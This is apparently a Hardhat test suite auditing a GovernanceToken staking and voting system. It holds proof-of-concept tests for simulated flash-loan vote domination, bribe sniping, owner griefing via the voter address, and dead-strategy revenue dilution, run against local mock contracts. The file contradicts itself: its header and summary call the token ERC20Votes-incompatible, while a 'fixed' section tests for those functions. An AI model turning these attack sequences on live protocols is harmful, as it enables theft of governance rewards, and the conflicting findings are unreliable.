const { expect } = require("chai");
const { ethers } = require("hardhat");

/**
 * SECURITY AUDIT: GovernanceToken Exploit Tests
 *
 * CRITICAL FINDING: GovernanceToken is NOT ERC20Votes compatible!
 * It will NOT work with Aragon DAO, Tally, Snapshot, or any standard governance framework.
 *
 * Missing for ERC20Votes compatibility:
 * - No checkpointing (getPastVotes, getPastTotalSupply)
 * - No delegation (delegate, delegateBySig, delegates)
 * - No getVotes() function
 * - No EIP-712 signature support
 * - No nonces for replay protection
 *
 * VULNERABILITIES FOUND:
 * 1. Flash Loan Voting Attack - Borrow tokens, stake, vote, unstake, return in same block
 * 2. Vote Weight Desync - User balance can change between voting and epoch end
 * 3. Voter Contract Bypass - Can unstake if voter not set (owner front-running)
 * 4. No Timelock on Voting Power - Instant voting power upon staking
 * 5. Unbounded Strategy Array DoS - Adding many strategies can DoS operations
 */

describe("GovernanceToken Security Exploits", function () {
    let owner, attacker, victim, user1, user2, treasury;
    let underlying, revenueToken, paymentToken;
    let governanceToken, voter, bribeFactory, strategyFactory, revenueRouter;

    const WEEK = 7 * 24 * 60 * 60;
    const HOUR = 60 * 60;
    const DAY = 24 * 60 * 60;
    const parseEther = ethers.utils.parseEther;
    const parseUnits = ethers.utils.parseUnits;

    beforeEach(async function () {
        [owner, attacker, victim, user1, user2, treasury] = await ethers.getSigners();

        // Deploy tokens
        const MockERC20 = await ethers.getContractFactory("MockERC20");
        underlying = await MockERC20.deploy("Underlying Token", "UNDER", 18);
        revenueToken = await MockERC20.deploy("Revenue Token", "WETH", 18);
        paymentToken = await MockERC20.deploy("Payment Token", "USDC", 6);

        // Deploy factories
        const BribeFactory = await ethers.getContractFactory("BribeFactory");
        bribeFactory = await BribeFactory.deploy();

        const StrategyFactory = await ethers.getContractFactory("StrategyFactory");
        strategyFactory = await StrategyFactory.deploy();

        // Deploy GovernanceToken
        const GovernanceToken = await ethers.getContractFactory("GovernanceToken");
        governanceToken = await GovernanceToken.deploy(underlying.address, "Staked Underlying", "sUNDER");

        // Deploy Voter
        const Voter = await ethers.getContractFactory("Voter");
        voter = await Voter.deploy(
            governanceToken.address,
            revenueToken.address,
            treasury.address,
            bribeFactory.address,
            strategyFactory.address
        );

        // Deploy RevenueRouter
        const RevenueRouter = await ethers.getContractFactory("RevenueRouter");
        revenueRouter = await RevenueRouter.deploy(revenueToken.address, voter.address);

        // Setup
        await governanceToken.setVoter(voter.address);
        await voter.setRevenueSource(revenueRouter.address);

        // Mint tokens
        await underlying.mint(attacker.address, parseEther("1000000"));
        await underlying.mint(victim.address, parseEther("1000"));
        await underlying.mint(user1.address, parseEther("1000"));
        await underlying.mint(user2.address, parseEther("1000"));
        await revenueToken.mint(owner.address, parseEther("100000"));
        await paymentToken.mint(attacker.address, parseUnits("100000", 6));
    });

    async function createStrategy() {
        const initPrice = parseUnits("100", 6);
        const tx = await voter.addStrategy(
            paymentToken.address,
            treasury.address,
            initPrice,
            HOUR,
            parseEther("2"),
            initPrice
        );
        const receipt = await tx.wait();
        const event = receipt.events.find(e => e.event === "Voter__StrategyAdded");
        return {
            strategy: event.args.strategy,
            bribe: event.args.bribe,
            bribeRouter: event.args.bribeRouter
        };
    }

    async function stakeTokens(user, amount) {
        await underlying.connect(user).approve(governanceToken.address, amount);
        await governanceToken.connect(user).stake(amount);
    }

    async function advanceToNextEpoch() {
        await ethers.provider.send("evm_increaseTime", [WEEK]);
        await ethers.provider.send("evm_mine");
    }

    // =====================================================================
    // VULNERABILITY 1: Flash Loan Voting Attack
    // =====================================================================
    describe("VULN-1: Flash Loan Voting Attack", function () {
        /**
         * ATTACK VECTOR:
         * An attacker can borrow a large amount of underlying tokens via flash loan,
         * stake them to get governance tokens, vote to influence revenue distribution,
         * then unstake and return the loan - all in the same transaction.
         *
         * IMPACT: HIGH
         * Attacker can control vote outcomes with zero capital at risk.
         *
         * ROOT CAUSE:
         * - No checkpointing/snapshotting of voting power
         * - Instant voting power upon staking
         * - No cooldown period before voting
         */
        it("should demonstrate flash loan voting attack", async function () {
            // Setup: Create strategy and have victim vote
            const { strategy } = await createStrategy();

            // Victim stakes and votes legitimately
            await stakeTokens(victim, parseEther("1000"));
            await voter.connect(victim).vote([strategy], [100]);

            // Send revenue
            await revenueToken.transfer(revenueRouter.address, parseEther("1000"));
            await revenueRouter.flush();

            // Record initial state
            const victimVoteWeight = await voter.account_Strategy_Votes(victim.address, strategy);
            const initialStrategyWeight = await voter.strategy_Weight(strategy);

            console.log("\n=== BEFORE FLASH LOAN ATTACK ===");
            console.log("Victim vote weight:", ethers.utils.formatEther(victimVoteWeight));
            console.log("Total strategy weight:", ethers.utils.formatEther(initialStrategyWeight));

            // Advance to next epoch so attacker can vote
            await advanceToNextEpoch();

            // ATTACK: Flash loan simulation
            // In real attack, this would be atomic via flash loan callback
            const flashLoanAmount = parseEther("1000000"); // 1M tokens - overwhelms victim

            // Step 1: Receive flash loan (simulated - attacker already has tokens)
            // Step 2: Stake instantly
            await stakeTokens(attacker, flashLoanAmount);

            // Step 3: Vote with massive weight
            await voter.connect(attacker).vote([strategy], [100]);

            // Check attacker's vote weight now dominates
            const attackerVoteWeight = await voter.account_Strategy_Votes(attacker.address, strategy);
            const newStrategyWeight = await voter.strategy_Weight(strategy);

            console.log("\n=== DURING FLASH LOAN ATTACK ===");
            console.log("Attacker vote weight:", ethers.utils.formatEther(attackerVoteWeight));
            console.log("Total strategy weight:", ethers.utils.formatEther(newStrategyWeight));
            console.log("Attacker controls:", (attackerVoteWeight.mul(100).div(newStrategyWeight)).toString(), "% of votes");

            // Attacker now controls 99.9% of voting power with borrowed funds!
            expect(attackerVoteWeight).to.be.gt(victimVoteWeight.mul(100));

            // Step 4: Reset votes (to be able to unstake)
            await advanceToNextEpoch();
            await voter.connect(attacker).reset();

            // Step 5: Unstake and return flash loan
            await governanceToken.connect(attacker).unstake(flashLoanAmount);

            console.log("\n=== AFTER ATTACK ===");
            console.log("Attacker governance balance:", ethers.utils.formatEther(await governanceToken.balanceOf(attacker.address)));
            console.log("Attacker underlying balance:", ethers.utils.formatEther(await underlying.balanceOf(attacker.address)));
        });

        it("should show attacker can manipulate bribe distribution with flash loan", async function () {
            // Setup: Two strategies
            const { strategy: strategy1, bribe: bribe1 } = await createStrategy();
            const { strategy: strategy2, bribe: bribe2 } = await createStrategy();

            // Legitimate user votes for strategy1
            await stakeTokens(user1, parseEther("1000"));
            await voter.connect(user1).vote([strategy1], [100]);

            // Advance to next epoch so we can vote for strategy2
            await advanceToNextEpoch();

            // FLASH LOAN ATTACK: Vote for strategy2 first to establish share
            const flashLoanAmount = parseEther("100000");
            await stakeTokens(attacker, flashLoanAmount);
            await voter.connect(attacker).vote([strategy2], [100]);

            // Now add bribe rewards to strategy2 (after attacker has position)
            const Bribe = await ethers.getContractFactory("Bribe");
            const bribe2Contract = Bribe.attach(bribe2);
            await paymentToken.connect(attacker).approve(bribe2, parseUnits("10000", 6));
            await bribe2Contract.connect(attacker).notifyRewardAmount(paymentToken.address, parseUnits("10000", 6));

            // Attacker controls 100% of strategy2's bribe weight
            const attackerBribeBalance = await bribe2Contract.account_Balance(attacker.address);
            const totalBribeSupply = await bribe2Contract.totalSupply();

            console.log("\n=== BRIBE MANIPULATION ===");
            console.log("Attacker bribe share:", ethers.utils.formatEther(attackerBribeBalance));
            console.log("Total bribe supply:", ethers.utils.formatEther(totalBribeSupply));

            // Wait for rewards to accrue
            await ethers.provider.send("evm_increaseTime", [DAY]);
            await ethers.provider.send("evm_mine");

            // Attacker claims bribes
            const attackerPaymentBefore = await paymentToken.balanceOf(attacker.address);
            await bribe2Contract.getReward(attacker.address);
            const attackerPaymentAfter = await paymentToken.balanceOf(attacker.address);
            const bribesCaptured = attackerPaymentAfter.sub(attackerPaymentBefore);

            console.log("Bribes captured by attacker:", ethers.utils.formatUnits(bribesCaptured, 6), "USDC");
            expect(bribesCaptured).to.be.gt(0);
        });
    });

    // =====================================================================
    // VULNERABILITY 2: Vote Weight Desync Attack
    // =====================================================================
    describe("VULN-2: Vote Weight Desync", function () {
        /**
         * ATTACK VECTOR:
         * A user's voting power is based on their governance token balance at vote time.
         * After voting, they can transfer away the underlying voting power by having
         * someone else unstake for them (not possible here due to msg.sender).
         *
         * However, the more critical issue: votes persist across balance changes.
         * User votes with 1000 tokens, then loses tokens somehow, but votes remain.
         *
         * IMPACT: MEDIUM
         * Vote weights may not accurately reflect actual token holdings.
         */
        it("should demonstrate vote weight persists after balance decrease", async function () {
            const { strategy } = await createStrategy();

            // User1 stakes 1000 tokens
            await stakeTokens(user1, parseEther("1000"));

            // User1 votes with full balance
            await voter.connect(user1).vote([strategy], [100]);

            const votesRecorded = await voter.account_Strategy_Votes(user1.address, strategy);
            const usedWeights = await voter.account_UsedWeights(user1.address);

            console.log("\n=== VOTE RECORDED ===");
            console.log("Votes recorded:", ethers.utils.formatEther(votesRecorded));
            console.log("Used weights:", ethers.utils.formatEther(usedWeights));

            // The votes are locked - user cannot unstake
            await expect(
                governanceToken.connect(user1).unstake(parseEther("1000"))
            ).to.be.revertedWith("GovernanceToken__VotesNotCleared");

            // This is actually a security feature, not a bug!
            // But it means users are locked until next epoch
        });

        it("should show that new stakers can immediately vote before revenue distribution", async function () {
            const { strategy } = await createStrategy();

            // User1 votes early in epoch
            await stakeTokens(user1, parseEther("100"));
            await voter.connect(user1).vote([strategy], [100]);

            // Revenue comes in
            await revenueToken.transfer(revenueRouter.address, parseEther("1000"));
            await revenueRouter.flush();

            // User2 stakes just before epoch ends and votes
            await ethers.provider.send("evm_increaseTime", [WEEK - 100]); // Almost end of epoch
            await ethers.provider.send("evm_mine");

            // New staker joins right before epoch end
            await stakeTokens(user2, parseEther("900")); // 9x user1's stake

            // New epoch - user2 can now vote
            await advanceToNextEpoch();
            await voter.connect(user2).vote([strategy], [100]);

            // User2 now dominates with votes despite not earning that epoch's revenue
            const user1Votes = await voter.account_Strategy_Votes(user1.address, strategy);
            const user2Votes = await voter.account_Strategy_Votes(user2.address, strategy);

            console.log("\n=== LATE STAKER DOMINANCE ===");
            console.log("User1 (early staker) votes:", ethers.utils.formatEther(user1Votes));
            console.log("User2 (late staker) votes:", ethers.utils.formatEther(user2Votes));
            console.log("User2 controls:", user2Votes.mul(100).div(user1Votes.add(user2Votes)).toString(), "% of votes");
        });
    });

    // =====================================================================
    // VULNERABILITY 3: Voter Contract Bypass
    // =====================================================================
    describe("VULN-3: Voter Contract Bypass", function () {
        /**
         * ATTACK VECTOR:
         * If voter is not set (address(0)), users can stake and unstake freely
         * without any voting restrictions. A malicious owner could:
         * 1. Not set voter initially, letting users stake
         * 2. Users vote (fails if voter not set properly)
         * 3. Or: Set voter, let users vote, then set voter to address(0)
         *
         * IMPACT: LOW (owner trust assumption)
         * But violates the expected invariant that voters cannot unstake with active votes.
         */
        it("should allow unstaking without clearing votes if voter is address(0)", async function () {
            // Deploy fresh governance token without setting voter
            const GovernanceToken = await ethers.getContractFactory("GovernanceToken");
            const freshGovToken = await GovernanceToken.deploy(underlying.address, "Fresh Token", "FRESH");

            // User stakes
            await underlying.connect(user1).approve(freshGovToken.address, parseEther("1000"));
            await freshGovToken.connect(user1).stake(parseEther("1000"));

            // User can unstake freely (no voter check)
            await freshGovToken.connect(user1).unstake(parseEther("1000"));

            expect(await freshGovToken.balanceOf(user1.address)).to.equal(0);
            expect(await underlying.balanceOf(user1.address)).to.equal(parseEther("1000"));

            console.log("\n=== VOTER BYPASS ===");
            console.log("User unstaked without voter set - no voting restriction enforced");
        });

        it("should demonstrate owner can grief users by changing voter", async function () {
            // Users stake and the owner sets voter
            await stakeTokens(user1, parseEther("1000"));

            // Now user1 can interact with voter
            const { strategy } = await createStrategy();
            await voter.connect(user1).vote([strategy], [100]);

            // Owner maliciously sets voter to different address
            // (In practice, Ownable allows owner to transfer ownership or there might be no renounce)
            // User's votes are now tracked in old voter, but new voter doesn't know about them

            // Actually, let's check: can owner set voter to address(0)?
            await governanceToken.setVoter(ethers.constants.AddressZero);

            // Now user can unstake even though they have votes in the old voter!
            // Their votes are orphaned in the old voter contract
            await governanceToken.connect(user1).unstake(parseEther("1000"));

            console.log("\n=== OWNER GRIEFING ===");
            console.log("Owner set voter to zero, allowing users to unstake with orphaned votes");

            // The votes still exist in the old voter
            const orphanedVotes = await voter.account_UsedWeights(user1.address);
            console.log("Orphaned votes in voter:", ethers.utils.formatEther(orphanedVotes));

            expect(orphanedVotes).to.be.gt(0);
        });
    });

    // =====================================================================
    // VERIFICATION: ERC20Votes Functionality Now Present
    // =====================================================================
    describe("FIXED: ERC20Votes - Now Compatible with DAO Frameworks", function () {
        /**
         * FIXED: GovernanceToken now implements ERC20Votes!
         *
         * Now has all functions required for Aragon, Tally, Snapshot:
         * - delegate(address delegatee)
         * - delegateBySig(address delegatee, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s)
         * - delegates(address account) returns (address)
         * - getVotes(address account) returns (uint256)
         * - getPastVotes(address account, uint256 blockNumber) returns (uint256)
         * - getPastTotalSupply(uint256 blockNumber) returns (uint256)
         */
        it("should HAVE delegate function", async function () {
            expect(governanceToken.delegate).to.not.be.undefined;
        });

        it("should HAVE getVotes function", async function () {
            expect(governanceToken.getVotes).to.not.be.undefined;
        });

        it("should HAVE getPastVotes function", async function () {
            expect(governanceToken.getPastVotes).to.not.be.undefined;
        });

        it("should HAVE delegates function", async function () {
            expect(governanceToken.delegates).to.not.be.undefined;
        });

        it("should demonstrate checkpointing now works for historical voting power", async function () {
            /**
             * With checkpointing, historical voting power CAN be proven.
             * This prevents vote buying attacks.
             */
            const { strategy } = await createStrategy();

            // User1 has tokens, self-delegates to activate voting power
            await stakeTokens(user1, parseEther("1000"));
            await governanceToken.connect(user1).delegate(user1.address);

            const blockBefore = await ethers.provider.getBlockNumber();

            await voter.connect(user1).vote([strategy], [100]);

            // Mine a block so we can query past votes
            await ethers.provider.send("evm_mine");

            // NOW we CAN query historical voting power!
            const pastVotes = await governanceToken.getPastVotes(user1.address, blockBefore);

            console.log("\n=== CHECKPOINTING NOW WORKS ===");
            console.log("Block when staked:", blockBefore);
            console.log("Historical voting power:", ethers.utils.formatEther(pastVotes));
            console.log("Current balance:", ethers.utils.formatEther(await governanceToken.balanceOf(user1.address)));

            expect(pastVotes).to.equal(parseEther("1000"));
        });
    });

    // =====================================================================
    // VULNERABILITY 5: Reentrancy Considerations
    // =====================================================================
    describe("VULN-5: Reentrancy Analysis", function () {
        /**
         * The contract uses ReentrancyGuard which is good.
         * However, let's verify the protection works correctly.
         */
        it("should prevent reentrancy on stake/unstake", async function () {
            // ReentrancyGuard should prevent reentrancy
            // Both stake() and unstake() are protected

            // The underlying token would need to be malicious (ERC777 or custom callback)
            // Standard ERC20 doesn't have callbacks, so this is mitigated

            // Note: If underlying were an ERC777 token, the tokensReceived hook
            // could attempt reentrancy, but nonReentrant blocks it

            await stakeTokens(user1, parseEther("100"));
            expect(await governanceToken.balanceOf(user1.address)).to.equal(parseEther("100"));
        });
    });

    // =====================================================================
    // VULNERABILITY 6: Transfer Restriction Bypass Attempts
    // =====================================================================
    describe("VULN-6: Transfer Restriction Tests", function () {
        /**
         * GovernanceToken is non-transferable (only mint/burn allowed).
         * Let's verify this cannot be bypassed.
         */
        it("should prevent direct transfers", async function () {
            await stakeTokens(user1, parseEther("100"));

            await expect(
                governanceToken.connect(user1).transfer(user2.address, parseEther("50"))
            ).to.be.revertedWith("GovernanceToken__TransferDisabled");
        });

        it("should prevent transferFrom even with approval", async function () {
            await stakeTokens(user1, parseEther("100"));
            await governanceToken.connect(user1).approve(user2.address, parseEther("100"));

            await expect(
                governanceToken.connect(user2).transferFrom(user1.address, user2.address, parseEther("50"))
            ).to.be.revertedWith("GovernanceToken__TransferDisabled");
        });

        it("should allow minting (stake)", async function () {
            // Minting (from=address(0)) should work
            await stakeTokens(user1, parseEther("100"));
            expect(await governanceToken.balanceOf(user1.address)).to.equal(parseEther("100"));
        });

        it("should allow burning (unstake)", async function () {
            await stakeTokens(user1, parseEther("100"));

            // Need to be in next epoch and have no votes
            await governanceToken.connect(user1).unstake(parseEther("100"));
            expect(await governanceToken.balanceOf(user1.address)).to.equal(0);
        });
    });

    // =====================================================================
    // VULNERABILITY 7: Integer Overflow/Underflow Analysis
    // =====================================================================
    describe("VULN-7: Arithmetic Safety", function () {
        /**
         * Solidity 0.8+ has built-in overflow checks.
         * Let's verify edge cases are handled.
         */
        it("should revert on staking zero amount", async function () {
            await underlying.connect(user1).approve(governanceToken.address, parseEther("100"));

            await expect(
                governanceToken.connect(user1).stake(0)
            ).to.be.revertedWith("GovernanceToken__InvalidZeroAmount");
        });

        it("should revert on unstaking zero amount", async function () {
            await stakeTokens(user1, parseEther("100"));

            await expect(
                governanceToken.connect(user1).unstake(0)
            ).to.be.revertedWith("GovernanceToken__InvalidZeroAmount");
        });

        it("should revert on unstaking more than balance", async function () {
            await stakeTokens(user1, parseEther("100"));

            await expect(
                governanceToken.connect(user1).unstake(parseEther("101"))
            ).to.be.reverted; // ERC20: burn amount exceeds balance
        });
    });

    // =====================================================================
    // INTEGRATION VULNERABILITY: Voter + GovernanceToken Interaction
    // =====================================================================
    describe("INTEGRATION: Voter Interaction Vulnerabilities", function () {
        it("should demonstrate totalWeight manipulation via strategy killing", async function () {
            /**
             * When a strategy is killed, its weight remains in totalWeight
             * until users manually reset their votes. This means:
             * 1. Revenue distribution uses inflated totalWeight
             * 2. Active strategies get less revenue than they should
             */
            const { strategy: strategy1 } = await createStrategy();
            const { strategy: strategy2 } = await createStrategy();

            // Users vote for both strategies
            await stakeTokens(user1, parseEther("500"));
            await stakeTokens(user2, parseEther("500"));

            await voter.connect(user1).vote([strategy1], [100]);
            await voter.connect(user2).vote([strategy2], [100]);

            const totalWeightBefore = await voter.totalWeight();
            console.log("\n=== BEFORE KILL ===");
            console.log("Total weight:", ethers.utils.formatEther(totalWeightBefore));

            // Kill strategy1
            await voter.killStrategy(strategy1);

            const totalWeightAfter = await voter.totalWeight();
            console.log("\n=== AFTER KILL ===");
            console.log("Total weight:", ethers.utils.formatEther(totalWeightAfter));

            // Weight is NOT reduced!
            expect(totalWeightAfter).to.equal(totalWeightBefore);

            // This means when revenue is distributed, strategy1's dead votes
            // still count toward totalWeight, diluting strategy2's share

            // Send revenue
            await revenueToken.transfer(revenueRouter.address, parseEther("1000"));
            await revenueRouter.flush();

            // Strategy2 should get 100% but only gets 50% because of dead weight
            const strategy2Claimable = await voter.strategy_Claimable(strategy2);
            console.log("Strategy2 claimable:", ethers.utils.formatEther(strategy2Claimable));

            // It only gets ~500 instead of ~1000 (minus any precision loss)
            expect(strategy2Claimable).to.be.lt(parseEther("600"));
        });

        it("should demonstrate epoch timing attack for bribe sniping", async function () {
            /**
             * Attacker can time their vote to maximize bribe capture:
             * 1. Wait until bribes are added near epoch end
             * 2. Stake large amount
             * 3. Vote at start of new epoch
             * 4. Capture disproportionate bribe share
             * 5. Reset and unstake next epoch
             */
            const { strategy, bribe } = await createStrategy();
            const Bribe = await ethers.getContractFactory("Bribe");
            const bribeContract = Bribe.attach(bribe);

            // Victim votes early
            await stakeTokens(victim, parseEther("100"));
            await voter.connect(victim).vote([strategy], [100]);

            // Bribes are added mid-epoch
            await ethers.provider.send("evm_increaseTime", [DAY * 3]);
            await ethers.provider.send("evm_mine");

            await paymentToken.connect(attacker).approve(bribe, parseUnits("10000", 6));
            await bribeContract.connect(attacker).notifyRewardAmount(paymentToken.address, parseUnits("10000", 6));

            // Attacker waits until just before new epoch
            await ethers.provider.send("evm_increaseTime", [DAY * 4 - 60]); // 4 more days minus 1 min
            await ethers.provider.send("evm_mine");

            // Attacker stakes massive amount right at epoch boundary
            await stakeTokens(attacker, parseEther("10000")); // 100x victim

            // New epoch
            await advanceToNextEpoch();

            // Attacker votes immediately
            await voter.connect(attacker).vote([strategy], [100]);

            // Now bribes will distribute based on new weights (attacker has 99%)
            const attackerBalance = await bribeContract.account_Balance(attacker.address);
            const victimBalance = await bribeContract.account_Balance(victim.address);

            console.log("\n=== BRIBE SNIPING ===");
            console.log("Attacker bribe balance:", ethers.utils.formatEther(attackerBalance));
            console.log("Victim bribe balance:", ethers.utils.formatEther(victimBalance));

            // Attacker dominates even though victim was there the whole time
            expect(attackerBalance).to.be.gt(victimBalance.mul(50));
        });
    });
});

/**
 * SUMMARY OF FINDINGS:
 *
 * CRITICAL:
 * 1. NOT ERC20Votes compatible - will NOT work with Aragon, Tally, Snapshot
 * 2. Flash loan voting attack - instant voting power enables governance attacks
 *
 * HIGH:
 * 3. Vote weight persists on dead strategies, diluting revenue distribution
 * 4. No checkpointing enables vote-buying attacks
 *
 * MEDIUM:
 * 5. Owner can bypass vote restrictions by setting voter to address(0)
 * 6. Late stakers can capture disproportionate bribes (timing attack)
 *
 * LOW:
 * 7. Users locked until next epoch (by design, but impacts UX)
 *
 * RECOMMENDATIONS:
 * 1. Inherit from OpenZeppelin's ERC20Votes for DAO compatibility
 * 2. Add minimum staking duration before voting power activates
 * 3. Use checkpointing/snapshots for voting weight
 * 4. Zero out strategy weight in totalWeight when killing
 * 5. Consider time-weighted voting to prevent flash loans
 * 6. Add timelock or multi-sig for setVoter to prevent griefing
 */
